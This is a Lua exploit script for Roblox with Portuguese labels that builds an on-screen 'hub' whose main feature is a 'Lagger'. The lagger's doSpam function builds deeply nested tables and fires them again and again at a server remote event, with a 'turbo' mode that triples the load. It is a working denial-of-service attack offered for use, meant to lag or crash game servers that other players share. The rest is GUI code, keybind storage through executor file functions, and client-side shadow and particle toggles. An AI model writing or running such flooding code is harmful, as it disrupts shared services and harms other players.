-- Novo Hub Roblox Aprimorado

local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local plrGui = plr:WaitForChild("PlayerGui")

local config = {
    lagger = {
        x = 2.5,
        y = 1,
        z = 0.15,
        remoteStuff = "RobloxReplicatedStorage.SetPlayerBlockList",
        turbo = false -- Nova opção para modo turbo
    },
    antiLag = {
        disableShadows = false,
        removeParticles = false
    },
    hotkey = nil
}

local guiElements = {}
local active = false

-- Funções de utilidade
local function createUIElement(elementType, properties, parent)
    local element = Instance.new(elementType)
    for prop, value in pairs(properties) do
        element[prop] = value
    end
    element.Parent = parent
    return element
end

-- GUI Principal
local screenGui = createUIElement("ScreenGui", {Name = "ImprovedRobloxHub", ResetOnSpawn = false}, plrGui)

-- Remover GUIs antigas com o mesmo nome
for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "ImprovedRobloxHub" and kid ~= screenGui then
        kid:Destroy()
    end
end

guiElements.mainFrame = createUIElement("Frame", {
    Name = "MainFrame",
    Size = UDim2.new(0, 300, 0, 350), -- Aumentar altura para novas seções
    Position = UDim2.new(0.5, -150, 0.5, -175),
    BackgroundColor3 = Color3.fromRGB(30, 30, 30),
    BackgroundTransparency = 0.1,
    BorderSizePixel = 0,
    Active = true,
    Draggable = true,
    ClipsDescendants = true
}, screenGui)

createUIElement("UICorner", {CornerRadius = UDim.new(0, 10)}, guiElements.mainFrame)
createUIElement("UIStroke", {Color = Color3.fromRGB(0, 0, 0), Thickness = 2, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, guiElements.mainFrame)

-- Top Bar
guiElements.topBar = createUIElement("Frame", {
    Name = "TitleBar",
    Size = UDim2.new(1, 0, 0, 28),
    BackgroundTransparency = 1
}, guiElements.mainFrame)

guiElements.titleText = createUIElement("TextLabel", {
    Size = UDim2.new(0.6, 0, 1, 0),
    Position = UDim2.new(0, 10, 0, 0),
    BackgroundTransparency = 1,
    Text = "Roblox Hub Aprimorado",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 14,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left
}, guiElements.topBar)

guiElements.statusText = createUIElement("TextLabel", {
    Size = UDim2.new(0.4, 0, 1, 0),
    Position = UDim2.new(0.6, 0, 0, 0),
    BackgroundTransparency = 1,
    Text = "OFF",
    TextColor3 = Color3.fromRGB(255, 100, 100),
    TextSize = 12,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Right
}, guiElements.topBar)

createUIElement("Frame", {
    Size = UDim2.new(1, -16, 0, 1),
    Position = UDim2.new(0, 8, 0, 28),
    BackgroundColor3 = Color3.fromRGB(0, 0, 0),
    BackgroundTransparency = 0.3,
    BorderSizePixel = 0
}, guiElements.mainFrame)

-- Conteúdo do Hub (abas ou seções)
guiElements.contentFrame = createUIElement("Frame", {
    Name = "ContentFrame",
    Size = UDim2.new(1, -16, 1, -40),
    Position = UDim2.new(0, 8, 0, 36),
    BackgroundColor3 = Color3.fromRGB(40, 40, 40),
    BackgroundTransparency = 0.1,
    BorderSizePixel = 0
}, guiElements.mainFrame)

createUIElement("UICorner", {CornerRadius = UDim.new(0, 8)}, guiElements.contentFrame)

-- Seção Lagger
guiElements.laggerSection = createUIElement("Frame", {
    Name = "LaggerSection",
    Size = UDim2.new(1, 0, 0.4, 0), -- Ajustar tamanho para acomodar Anti-Lag
    Position = UDim2.new(0, 0, 0, 0),
    BackgroundColor3 = Color3.fromRGB(50, 50, 50),
    BackgroundTransparency = 0.1,
    BorderSizePixel = 0
}, guiElements.contentFrame)

createUIElement("TextLabel", {
    Size = UDim2.new(1, 0, 0, 20),
    Position = UDim2.new(0, 0, 0, 5),
    BackgroundTransparency = 1,
    Text = "Configurações do Lagger",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 16,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Center
}, guiElements.laggerSection)

-- Botão de Ativar/Desativar Lagger
guiElements.toggleLaggerBtn = createUIElement("TextButton", {
    Name = "ToggleLaggerButton",
    Size = UDim2.new(0.8, 0, 0, 30),
    Position = UDim2.new(0.1, 0, 0, 30),
    BackgroundColor3 = Color3.fromRGB(22, 22, 22),
    BorderSizePixel = 0,
    AutoButtonColor = false,
    Text = "Ativar Lagger",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 14,
    Font = Enum.Font.GothamBold
}, guiElements.laggerSection)

createUIElement("UICorner", {CornerRadius = UDim.new(0, 8)}, guiElements.toggleLaggerBtn)
createUIElement("UIStroke", {Color = Color3.fromRGB(0, 0, 0), Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, guiElements.toggleLaggerBtn)

-- Input fields para cfg.x, cfg.y, cfg.z
local function createConfigInput(parent, labelText, initialValue, yOffset, configKey, configTable)
    local label = createUIElement("TextLabel", {
        Size = UDim2.new(0.3, 0, 0, 20),
        Position = UDim2.new(0.05, 0, 0, yOffset),
        BackgroundTransparency = 1,
        Text = labelText,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextSize = 12,
        Font = Enum.Font.Gotham
    }, parent)

    local textBox = createUIElement("TextBox", {
        Size = UDim2.new(0.6, 0, 0, 20),
        Position = UDim2.new(0.35, 0, 0, yOffset),
        BackgroundColor3 = Color3.fromRGB(60, 60, 60),
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextSize = 12,
        Font = Enum.Font.Gotham,
        Text = tostring(initialValue),
        ClearTextOnFocus = false
    }, parent)
    createUIElement("UICorner", {CornerRadius = UDim.new(0, 5)}, textBox)

    textBox.FocusLost:Connect(function(enterPressed)
        local value = tonumber(textBox.Text)
        if value then
            configTable[configKey] = value
        else
            textBox.Text = tostring(configTable[configKey]) -- Reverter se o input for inválido
        end
    end)
    return textBox
end

guiElements.inputX = createConfigInput(guiElements.laggerSection, "X (Incremento):", config.lagger.x, 70, "x", config.lagger)
guiElements.inputY = createConfigInput(guiElements.laggerSection, "Y (Tentativas):", config.lagger.y, 100, "y", config.lagger)
guiElements.inputZ = createConfigInput(guiElements.laggerSection, "Z (Intervalo):", config.lagger.z, 130, "z", config.lagger)

-- Botão Turbo para Lagger
guiElements.toggleTurboBtn = createUIElement("TextButton", {
    Name = "ToggleTurboButton",
    Size = UDim2.new(0.8, 0, 0, 30),
    Position = UDim2.new(0.1, 0, 0, 160),
    BackgroundColor3 = Color3.fromRGB(22, 22, 22),
    BorderSizePixel = 0,
    AutoButtonColor = false,
    Text = "Modo Turbo: OFF",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 14,
    Font = Enum.Font.GothamBold
}, guiElements.laggerSection)

createUIElement("UICorner", {CornerRadius = UDim.new(0, 8)}, guiElements.toggleTurboBtn)
createUIElement("UIStroke", {Color = Color3.fromRGB(0, 0, 0), Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, guiElements.toggleTurboBtn)

-- Seção Anti-Lag
guiElements.antiLagSection = createUIElement("Frame", {
    Name = "AntiLagSection",
    Size = UDim2.new(1, 0, 0.4, 0), -- Ajustar tamanho
    Position = UDim2.new(0, 0, 0.4, 0), -- Posicionar abaixo da seção Lagger
    BackgroundColor3 = Color3.fromRGB(50, 50, 50),
    BackgroundTransparency = 0.1,
    BorderSizePixel = 0
}, guiElements.contentFrame)

createUIElement("TextLabel", {
    Size = UDim2.new(1, 0, 0, 20),
    Position = UDim2.new(0, 0, 0, 5),
    BackgroundTransparency = 1,
    Text = "Configurações Anti-Lag",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 16,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Center
}, guiElements.antiLagSection)

-- Botão para Desativar Sombras
guiElements.toggleShadowsBtn = createUIElement("TextButton", {
    Name = "ToggleShadowsButton",
    Size = UDim2.new(0.8, 0, 0, 30),
    Position = UDim2.new(0.1, 0, 0, 30),
    BackgroundColor3 = Color3.fromRGB(22, 22, 22),
    BorderSizePixel = 0,
    AutoButtonColor = false,
    Text = "Desativar Sombras: OFF",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 14,
    Font = Enum.Font.GothamBold
}, guiElements.antiLagSection)

createUIElement("UICorner", {CornerRadius = UDim.new(0, 8)}, guiElements.toggleShadowsBtn)
createUIElement("UIStroke", {Color = Color3.fromRGB(0, 0, 0), Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, guiElements.toggleShadowsBtn)

-- Botão para Remover Partículas
guiElements.toggleParticlesBtn = createUIElement("TextButton", {
    Name = "ToggleParticlesButton",
    Size = UDim2.new(0.8, 0, 0, 30),
    Position = UDim2.new(0.1, 0, 0, 70),
    BackgroundColor3 = Color3.fromRGB(22, 22, 22),
    BorderSizePixel = 0,
    AutoButtonColor = false,
    Text = "Remover Partículas: OFF",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 14,
    Font = Enum.Font.GothamBold
}, guiElements.antiLagSection)

createUIElement("UICorner", {CornerRadius = UDim.new(0, 8)}, guiElements.toggleParticlesBtn)
createUIElement("UIStroke", {Color = Color3.fromRGB(0, 0, 0), Thickness = 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, guiElements.toggleParticlesBtn)

-- Seção de Keybind
guiElements.keybindSection = createUIElement("Frame", {
    Name = "KeybindSection",
    Size = UDim2.new(1, 0, 0.2, 0), -- Ajustar tamanho
    Position = UDim2.new(0, 0, 0.8, 0), -- Posicionar abaixo da seção Anti-Lag
    BackgroundColor3 = Color3.fromRGB(50, 50, 50),
    BackgroundTransparency = 0.1,
    BorderSizePixel = 0
}, guiElements.contentFrame)

createUIElement("TextLabel", {
    Size = UDim2.new(0.4, 0, 1, 0),
    Position = UDim2.new(0.05, 0, 0, 0),
    BackgroundTransparency = 1,
    Text = "Hotkey:",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 12,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left
}, guiElements.keybindSection)

guiElements.keybindBtn = createUIElement("TextButton", {
    Name = "KeybindButton",
    Size = UDim2.new(0.3, 0, 0, 20),
    Position = UDim2.new(0.45, 0, 0, 15),
    BackgroundColor3 = Color3.fromRGB(60, 60, 60),
    BorderSizePixel = 0,
    AutoButtonColor = false,
    Text = "?",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 12,
    Font = Enum.Font.GothamBold
}, guiElements.keybindSection)

createUIElement("UICorner", {CornerRadius = UDim.new(0, 5)}, guiElements.keybindBtn)

-- Funções do Lagger (adaptadas do script original)
local function getRemote(road)
    if not road or road == "" then
        return nil
    end
    local obj = game
    local clean = road:gsub("^game%.", "")
    for piece in clean:gmatch("[^%.]+") do
        if obj then
            obj = obj[piece]
        else
            return nil
        end
    end
    return obj
end

local function doSpam(inc, attempts)
    local currentInc = inc
    local currentAttempts = attempts

    if config.lagger.turbo then
        currentInc = inc * 3 -- Aumentar o incremento no modo turbo
        currentAttempts = attempts * 3 -- Aumentar as tentativas no modo turbo
    end

    local mainTable = {}
    local spamTable = {}
    table.insert(spamTable, {})
    local ptr = spamTable[1]
    for i = 1, currentInc do
        local newTable = {}
        table.insert(ptr, newTable)
        ptr = newTable
    end
    for i = 1, 15000 do
        table.insert(mainTable, spamTable)
        if i % 1000 == 0 then
            task.wait()
        end
    end

    local remoteObj = getRemote(config.lagger.remoteStuff)
    if remoteObj then
        for i = 1, currentAttempts do
            pcall(function()
                if remoteObj:IsA("RemoteEvent") or remoteObj:IsA("UnreliableRemoteEvent") then
                    remoteObj:FireServer(mainTable)
                elseif remoteObj:IsA("RemoteFunction") then
                    remoteObj:InvokeServer(mainTable)
                end
            end)
        end
    end
end

local function runLoop()
    while active do
        task.spawn(function()
            doSpam(config.lagger.x, config.lagger.y)
        end)
        task.wait(config.lagger.z)
    end
end

local function updateStatusText()
    if active then
        guiElements.statusText.Text = "ON"
        guiElements.statusText.TextColor3 = Color3.fromRGB(100, 255, 100)
        guiElements.toggleLaggerBtn.Text = "Desativar Lagger"
        guiElements.toggleLaggerBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    else
        guiElements.statusText.Text = "OFF"
        guiElements.statusText.TextColor3 = Color3.fromRGB(255, 100, 100)
        guiElements.toggleLaggerBtn.Text = "Ativar Lagger"
        guiElements.toggleLaggerBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
    end

    if config.lagger.turbo then
        guiElements.toggleTurboBtn.Text = "Modo Turbo: ON"
        guiElements.toggleTurboBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    else
        guiElements.toggleTurboBtn.Text = "Modo Turbo: OFF"
        guiElements.toggleTurboBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
    end

    if config.antiLag.disableShadows then
        guiElements.toggleShadowsBtn.Text = "Desativar Sombras: ON"
        guiElements.toggleShadowsBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    else
        guiElements.toggleShadowsBtn.Text = "Desativar Sombras: OFF"
        guiElements.toggleShadowsBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
    end

    if config.antiLag.removeParticles then
        guiElements.toggleParticlesBtn.Text = "Remover Partículas: ON"
        guiElements.toggleParticlesBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    else
        guiElements.toggleParticlesBtn.Text = "Remover Partículas: OFF"
        guiElements.toggleParticlesBtn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
    end
end

local function flip(state)
    active = state
    updateStatusText()
    if active then
        task.spawn(runLoop)
    end
end

-- Funções Anti-Lag
local function applyAntiLagSettings()
    if config.antiLag.disableShadows then
        game.Lighting.GlobalShadows = false
        game.Lighting.OutdoorGlobalShadows = false
    else
        game.Lighting.GlobalShadows = true
        game.Lighting.OutdoorGlobalShadows = true
    end

    if config.antiLag.removeParticles then
        for _, v in ipairs(game:GetDescendants()) do
            if v:IsA("ParticleEmitter") then
                v.Enabled = false
            end
        end
    else
        -- Reativar partículas (pode ser complexo se já foram desativadas/destruídas)
        -- Para simplificar, esta função apenas desativa. Reativar exigiria guardar o estado original.
        -- Por enquanto, apenas desativa.
    end
end

-- Lógica de Keybind (adaptada do script original)
local saveLoc = "ImprovedRobloxHub_Keybind.txt"

local function grabKey()
    local worked, data = pcall(readfile, saveLoc)
    if worked and data and data ~= "" then
        for _, code in pairs(Enum.KeyCode:GetEnumItems()) do
            if code.Name == data then
                config.hotkey = code
                guiElements.keybindBtn.Text = code.Name:sub(1,1)
                break
            end
        end
    end
    if not config.hotkey then
        guiElements.keybindBtn.Text = "?"
    end
end

local function storeKey(key)
    config.hotkey = key
    guiElements.keybindBtn.Text = key.Name:sub(1,1)
    pcall(writefile, saveLoc, key.Name)
end

grabKey()
updateStatusText()
applyAntiLagSettings() -- Aplicar configurações anti-lag iniciais

-- Conexões de eventos
guiElements.toggleLaggerBtn.MouseButton1Click:Connect(function()
    flip(not active)
end)

guiElements.toggleTurboBtn.MouseButton1Click:Connect(function()
    config.lagger.turbo = not config.lagger.turbo
    updateStatusText()
end)

guiElements.toggleShadowsBtn.MouseButton1Click:Connect(function()
    config.antiLag.disableShadows = not config.antiLag.disableShadows
    applyAntiLagSettings()
    updateStatusText()
end)

guiElements.toggleParticlesBtn.MouseButton1Click:Connect(function()
    config.antiLag.removeParticles = not config.antiLag.removeParticles
    applyAntiLagSettings()
    updateStatusText()
end)

local waitingForKeybind = false

guiElements.keybindBtn.MouseButton1Click:Connect(function()
    waitingForKeybind = true
    guiElements.keybindBtn.Text = "..."
end)

UserInputService.InputBegan:Connect(function(input, processedInput)
    if processedInput then
        return
    end

    if input.KeyCode == Enum.KeyCode.LeftControl then
        guiElements.mainFrame.Visible = not guiElements.mainFrame.Visible
        return
    end

    if waitingForKeybind and input.UserInputType == Enum.UserInputType.Keyboard then
        storeKey(input.KeyCode)
        waitingForKeybind = false
    elseif config.hotkey and input.KeyCode == config.hotkey then
        flip(not active)
    end
end)

-- Botão de fechar
local closeBtn = createUIElement("TextButton", {
    Size = UDim2.new(0, 20, 1, 0),
    Position = UDim2.new(1, -25, 0, 0),
    BackgroundTransparency = 1,
    Text = "X",
    TextColor3 = Color3.fromRGB(255, 50, 50),
    TextSize = 16,
    Font = Enum.Font.GothamBold
}, guiElements.topBar)
closeBtn.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- Botão de minimizar
local minimized = false
local originalSize = guiElements.mainFrame.Size
local miniBtn = createUIElement("TextButton", {
    Size = UDim2.new(0, 20, 1, 0),
    Position = UDim2.new(1, -50, 0, 0),
    BackgroundTransparency = 1,
    Text = "_",
    TextColor3 = Color3.fromRGB(255, 255, 255),
    TextSize = 16,
    Font = Enum.Font.GothamBold
}, guiElements.topBar)
miniBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    guiElements.contentFrame.Visible = not minimized
    if minimized then
        guiElements.mainFrame:TweenSize(UDim2.new(0, originalSize.X.Offset, 0, 28), "Out", "Quad", 0.2, true)
    else
        guiElements.mainFrame:TweenSize(originalSize, "Out", "Quad", 0.2, true)
    end
end)
